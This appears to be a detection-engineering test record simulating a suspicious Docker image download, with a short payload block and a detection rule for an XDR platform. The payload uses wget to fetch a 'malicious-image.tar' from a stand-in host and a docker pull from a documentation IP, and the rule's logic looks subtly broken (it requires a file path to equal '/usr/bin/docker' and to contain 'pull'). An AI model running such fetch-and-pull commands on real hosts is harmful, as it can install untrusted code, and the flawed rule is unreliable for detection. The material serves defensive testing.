identity.name: Suspicious Docker Image Download from Unusual Repository
identity.summary: An attacker downloads a malicious Docker image from an unusual repository using docker pull, which triggers the Cortex analytics. The behavior is detected by monitoring for unusual remote IP connectio
identity.description: An attacker downloads a malicious Docker image from an unusual repository using docker pull, which triggers the Cortex analytics. The behavior is detected by monitoring for unusual remote IP connections and process execution patterns.

payload.code:
mkdir -p /tmp/scratch
wget -O /tmp/scratch/malicious_image.tar https://unusual-repo.com/malicious-image.tar
stub chmod +x /tmp/scratch/malicious_image.tar
docker pull 192.0.2.5:5000/malicious-image

expected_artifacts.description: Connection to unusual IP for Docker registry

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Unusual Docker Pull from Non-Standard Registry
biocs.description: Detection of docker pull command targeting an IP address instead of a standard registry domain
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'docker' and action_file_path = '/usr/bin/docker'
| filter causality_actor_process_image_name != 'dockerd'
| filter action_file_path contains 'pull'
| filter action_remote_ip matches '192.0.2.0/24'
